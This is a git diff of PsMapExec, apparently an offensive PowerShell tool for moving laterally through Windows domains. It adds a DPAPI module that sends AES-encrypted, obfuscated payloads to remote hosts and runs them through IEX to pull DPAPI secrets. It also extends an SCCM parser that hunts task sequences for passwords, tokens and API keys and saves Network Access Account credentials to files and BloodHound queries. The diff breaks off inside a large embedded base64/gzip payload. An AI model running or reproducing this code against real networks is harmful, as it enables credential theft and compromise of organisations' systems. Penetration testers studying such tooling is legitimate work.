@@ -318,7 +318,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
 
 Github  : https://github.com/The-Viper-One
 Wiki    : https://github.com/The-Viper-One/PsMapExec/wiki
-Version : 0.8.0")
+Version : 0.8.1")
 
     # Display banner once then prevent for consecutive execution
     Function DisplayBanner {
@@ -356,6 +356,7 @@ Version : 0.8.0")
     $DCSyncDir = Join-Path $PME "DCSync"
     $DCSyncFullDump = Join-Path $DCSyncDir "DCSync_Full_Dump"
     $DCSyncUser = Join-Path $DCSyncDir "DCSync_User_Dump"
+    $DPAPI = Join-Path $PME "DPAPI"
     $ekeys = Join-Path $PME "eKeys"
     $FileZilla = Join-Path $PME "FileZilla"
     $IPMI = Join-Path $PME "IPMI"
@@ -393,6 +394,7 @@ Version : 0.8.0")
         $DCSyncDir,
         $DCSyncFullDump,
         $DCSyncUser,
+        $DPAPI,
         $ekeys,
         $FileZilla,
         $IPMI,
@@ -706,6 +708,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             "AddToGroup" {}
             "Amnesiac" {}
             "ConsoleHistory" {}
+            "DPAPI" {}
             "Elevate" {}
             "eKeys" {}
             "FileZilla" {}
@@ -745,7 +748,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Invalid Module specified"
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                Write-Host "Specify either: AddComputer, AddRBCD, AddSPN, AddToGroup, Amnesiac, ConsoleHistory, Elevate, ekeys, FileZilla, Files, KerbDump, LogonPasswords, LSA, LSA-Trust, MDF, MAQ, Notepad, NTDS, NTLM, RemoveComputer, RemoveFromGroup, RemoveRBCD, RemoveSPN, ResetPassword, RunAsPPL, SAM, SCCM, SSH, SessionExec, SessionRelay, TGTDeleg, Test, Tickets, Timeroast, ToggleAccount VMCheck, VNC, WHOAMI, WiFi, or WinSCP"
+                Write-Host "Specify either: AddComputer, AddRBCD, AddSPN, AddToGroup, Amnesiac, ConsoleHistory, DPAPI, Elevate, ekeys, FileZilla, Files, KerbDump, LogonPasswords, LSA, LSA-Trust, MDF, MAQ, Notepad, NTDS, NTLM, RemoveComputer, RemoveFromGroup, RemoveRBCD, RemoveSPN, ResetPassword, RunAsPPL, SAM, SCCM, SSH, SessionExec, SessionRelay, TGTDeleg, Test, Tickets, Timeroast, ToggleAccount VMCheck, VNC, WHOAMI, WiFi, or WinSCP"
                 return
             }
         }
@@ -2746,6 +2749,19 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         
     }
 
+    # DPAPI
+    elseif ($Module -eq "DPAPI") {
+        
+        $Key = Generate-RandomString 32
+        $IV = Generate-RandomString 16  
+
+        $Command = $LocalSCCM
+        $Command = obfuscation-arguments
+
+        $Data = Invoke-AES -k $Key -iv $IV -t $Command
+        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-PowerDPAPI MachineTriage "
+    }
+
     # NTDS
     elseif ($Module -eq "NTDS") {
         $Key = Generate-RandomString 32
@@ -3015,8 +3031,9 @@ $rbs ; `$b = (invoke-rtickets send /nowrap) ; (`$b | Select-String -Pattern 'doI
         $Command = obfuscation-arguments
 
         $Data = Invoke-AES -k $Key -iv $IV -t $Command
-        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX "
+        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-PowerDPAPI sccm "
     }
+
 
     # SAM
     elseif ($Module -eq "SAM") {
@@ -3620,6 +3637,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                 "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                 "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
@@ -4089,6 +4107,7 @@ while (`$true) {
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                 "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                 "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
@@ -4501,6 +4520,7 @@ while (`$true) {
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                 "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                 "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
@@ -5721,6 +5741,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
 
                             $filePath = switch ($Module) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                 "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                 "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
@@ -9718,122 +9739,181 @@ public class Advapi32 {
     ############################################## Function: Parse-SCCM ############################################
     ################################################################################################################
 
-    function Parse-SCCM {
+function Parse-SCCM {
 
-        if ($Global:SuccessCount -eq 0) { return }
+    if ($Global:SuccessCount -eq 0) { return }
 
-        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
-        Start-Sleep -Seconds 2
+    Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
+    Start-Sleep -Seconds 2
 
-        Get-ChildItem -Path $SCCM -Filter '*-SCCM.txt' | ForEach-Object {
-            $DirectoryName = $_.Name -replace "-SCCM.txt$"
-            $DirectoryPath = Join-Path -Path $SCCM -ChildPath $DirectoryName
-            New-Item -ItemType 'Directory' -Name $DirectoryName -Path $SCCM -Force | Out-Null
+    Get-ChildItem -Path $SCCM -Filter '*-SCCM.txt' | ForEach-Object {
+        $DirectoryName = $_.Name -replace "-SCCM.txt$"
+        $DirectoryPath = Join-Path -Path $SCCM -ChildPath $DirectoryName
+        New-Item -ItemType 'Directory' -Name $DirectoryName -Path $SCCM -Force | Out-Null
 
-            $newFilePath = Join-Path -Path $DirectoryPath -ChildPath $_.Name
-            Move-Item -Path $_.FullName -Destination $newFilePath -Force
-            Process-File -FilePath $newFilePath -DirectoryPath $DirectoryPath -ComputerName $DirectoryName
+        $newFilePath = Join-Path -Path $DirectoryPath -ChildPath $_.Name
+        Move-Item -Path $_.FullName -Destination $newFilePath -Force
+        Process-File -FilePath $newFilePath -DirectoryPath $DirectoryPath -ComputerName $DirectoryName
             
-        }
     }
+}
 
-    function Process-File {
-        param (
-            [string]$FilePath,
-            [string]$DirectoryPath,
-            [string]$ComputerName
-        )
+function Process-File {
+    param (
+        [string]$FilePath,
+        [string]$DirectoryPath,
+        [string]$ComputerName
+    )
 
-        [string]$DataOutput = Get-Content -Path $FilePath
+    [string]$DataOutput = Get-Content -Path $FilePath
 
-        $TaskSequences = @()
-        $UniqueSequences = @{}
-        $UniqueCredentials = @{}
-        $InterestingFiles = @()
+    $TaskSequences = @()
+    $UniqueSequences = @{}
+    $UniqueCredentials = @{}
+    $InterestingFiles = @()
 
-        $TaskSequences += Select-String -InputObject $DataOutput -Pattern "<sequence version=.*?</sequence>" -AllMatches
-        $counter = 0
+    $TaskSequences += Select-String -InputObject $DataOutput -Pattern "<sequence version=.*?</sequence>" -AllMatches
+    $counter = 0
 
-        # Process each sequence, save only if unique
-        foreach ($Match in $TaskSequences.Matches) {
-            $sequenceHash = [System.BitConverter]::ToString([System.Security.Cryptography.HashAlgorithm]::Create("MD5").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Match.Value)))
+    # Process each sequence, save only if unique
+    foreach ($Match in $TaskSequences.Matches) {
+        $sequenceHash = [System.BitConverter]::ToString([System.Security.Cryptography.HashAlgorithm]::Create("MD5").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Match.Value)))
 
-            if (-not $UniqueSequences.ContainsKey($sequenceHash)) {
-                $UniqueSequences[$sequenceHash] = $true
-                $sequenceXml = [xml]$Match.Value
-                $filename = Join-Path -Path $DirectoryPath -ChildPath "TaskSequence_$counter.xml"
-                $sequenceXml.Save($filename)
-                $counter++
+        if (-not $UniqueSequences.ContainsKey($sequenceHash)) {
+            $UniqueSequences[$sequenceHash] = $true
+            $sequenceXml = [xml]$Match.Value
+            $filename = Join-Path -Path $DirectoryPath -ChildPath "TaskSequence_$counter.xml"
+            $sequenceXml.Save($filename)
+            $counter++
 
-                # Check for specific keywords
-                $keywords = @('OSDLocalAdminPassword', 'OSDDomainName', 'OSDJoinPassword', 'OSDJoinAccount', 'OSDRegisteredUserName', 'OSDRegisteredOrgName', 'net user', 'convertto-securestring', 'password')
-                foreach ($keyword in $keywords) {
-                    if ($sequenceXml.InnerXml -match $keyword) {
-                        $InterestingFiles += $filename | Split-Path -Leaf
-                        break
-                    }
+            # Check for specific keywords
+                
+            $keywords = @(
+                
+                # SCCM / OSD-specific
+                'OSDLocalAdminPassword',
+                'OSDDomainName',
+                'OSDJoinPassword',
+                'OSDJoinAccount',
+                'OSDRegisteredUserName',
+                'OSDRegisteredOrgName',
+
+                # Core Windows cmds
+                'net user',
+                'net use', # often used with /user:domain\user password
+                'net localgroup',
+
+                # PowerShell-centric
+                'convertto-securestring',
+                'Get-Credential',
+                'New-Object System.Management.Automation.PSCredential',
+                'SecureString',
+
+                # Generic password hints
+                'password',
+                'pwd',
+                'pass',
+
+                # Credential objects / switches
+                'credential',
+                'creds',
+                '-user',
+                '-username',
+                '/u:',
+                '-pwd',
+                '-pass',
+                '/p:',
+
+                # API-style secrets
+                'apikey',
+                'api key',
+                'accesskey',
+                'secretkey',
+                'secret',
+                'authtoken',
+                'token',
+                'clientsecret',
+                'clientid',
+                'subscriptionkey',
+
+                # DB / connection strings
+                'connectionstring',
+                'databasepassword',
+
+                # Cloud / storage
+                'storageaccountkey',
+                'cosmoskey',
+                'keyvault',
+                'certthumbprint'
+            )
+
+            foreach ($keyword in $keywords) {
+                if ($sequenceXml.InnerXml -match $keyword) {
+                    $InterestingFiles += $filename | Split-Path -Leaf
+                    break
                 }
             }
         }
+    }
 
-        if ($counter -gt 0) {
-            Write-Host ""
+    if ($counter -gt 0) {
+        Write-Host ""
+        Write-Host ""
+        Write-Host "-[$ComputerName]-"
+        Write-Host ""
+ 
+        Write-Host "Task Sequences"
+        Write-Host "Directory Path  : $DirectoryPath"
+        Write-Host "Task Sequences  : Found $($counter) Task Sequences and saved to XML"
+
+        if ($InterestingFiles.Count -gt 0) {
+            Write-Host "Possible Creds  : " -NoNewline
+            Write-Host "$($InterestingFiles -join ', ')" -NoNewline -ForegroundColor "Yellow"
+            Write-Host " <--- check for creds!"
+        }
+    }
+
+    Write-Host ""
+
+    $NAACredentials = @()
+    $NAACredentials += Select-String -InputObject $DataOutput -Pattern "Network Access Username:\s*(.+?)\s*Network Access Password:\s*(\S+)" -AllMatches
+
+    foreach ($cred in $NAACredentials.Matches) {
+        $NAAUsername = ($cred.Groups[1].Value -replace '[\x00-\x1F\x7F]', '').Trim()
+        $NAAPassword = ($cred.Groups[2].Value -replace '[\x00-\x1F\x7F]', '').Trim()
+        $Credential = "$NAAUsername`:$NAAPassword"
+
+        # Extract domain and username for BH Query
+        $Split = $NAAUsername -split '\\'
+        $NAADomain = $Split[0]
+        $NAAUser = $Split[1]
+        Append-BHQuery -UserName $NAAUser -Domain $NAADomain -UserOwned -Password $NAAPassword -PasswordProperty
+
+        if (-not $UniqueCredentials.ContainsKey($Credential)) {
+            $UniqueCredentials[$Credential] = $true
+        }
+    }
+
+    if ($UniqueCredentials.Count -gt 0) {
+        if ($counter -lt 1) {
             Write-Host ""
             Write-Host "-[$ComputerName]-"
             Write-Host ""
- 
-            Write-Host "Task Sequences"
-            Write-Host "Directory Path  : $DirectoryPath"
-            Write-Host "Task Sequences  : Found $($counter) Task Sequences and saved to XML"
-
-            if ($InterestingFiles.Count -gt 0) {
-                Write-Host "Possible Creds  : " -NoNewline
-                Write-Host "$($InterestingFiles -join ', ')" -NoNewline -ForegroundColor "Yellow"
-                Write-Host " <--- check for creds!"
-            }
         }
 
-        Write-Host ""
+        $outputFile = Join-Path -Path $DirectoryPath -ChildPath "NAA-Credentials.txt"
 
-        $NAACredentials = @()
-        $NAACredentials += Select-String -InputObject $DataOutput -Pattern "Network Access Username:\s*(.+?)\s*Network Access Password:\s*(\S+)" -AllMatches
+        Write-Host "Network Access Accounts"
+        Write-Host "NAA File Path   : $outputFile"
 
-        foreach ($cred in $NAACredentials.Matches) {
-            $NAAUsername = ($cred.Groups[1].Value -replace '[\x00-\x1F\x7F]', '').Trim()
-            $NAAPassword = ($cred.Groups[2].Value -replace '[\x00-\x1F\x7F]', '').Trim()
-            $Credential = "$NAAUsername`:$NAAPassword"
-
-            # Extract domain and username for BH Query
-            $Split = $NAAUsername -split '\\'
-            $NAADomain = $Split[0]
-            $NAAUser = $Split[1]
-            Append-BHQuery -UserName $NAAUser -Domain $NAADomain -UserOwned -Password $NAAPassword -PasswordProperty
-
-            if (-not $UniqueCredentials.ContainsKey($Credential)) {
-                $UniqueCredentials[$Credential] = $true
-            }
+        foreach ($Credential in $UniqueCredentials.Keys) {
+            Write-Host "NAA Credentials :" -NoNewline
+            Write-Host " $Credential" -ForegroundColor "Yellow"
         }
 
-        if ($UniqueCredentials.Count -gt 0) {
-            if ($counter -lt 1) {
-                Write-Host ""
-                Write-Host "-[$ComputerName]-"
-                Write-Host ""
-            }
-
-            $outputFile = Join-Path -Path $DirectoryPath -ChildPath "NAA-Credentials.txt"
-
-            Write-Host "Network Access Accounts"
-            Write-Host "NAA File Path   : $outputFile"
-
-            foreach ($Credential in $UniqueCredentials.Keys) {
-                Write-Host "NAA Credentials :" -NoNewline
-                Write-Host " $Credential" -ForegroundColor "Yellow"
-            }
-
-            $UniqueCredentials.Keys | Out-File -FilePath $outputFile
-        }
+        $UniqueCredentials.Keys | Out-File -FilePath $outputFile
     }
+}
 
     ################################################################################################################
     ################################################## Function: MDF ###############################################
@@ -10180,22 +10260,2168 @@ foreach ($user in $users) {
 
 
 $Global:LocalSCCM = @'
-function Invoke-LocalSCCM {
+function Invoke-FunctionLookup {
+    param ([string] $moduleName, [string] $functionName)
 
-    $lss=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG("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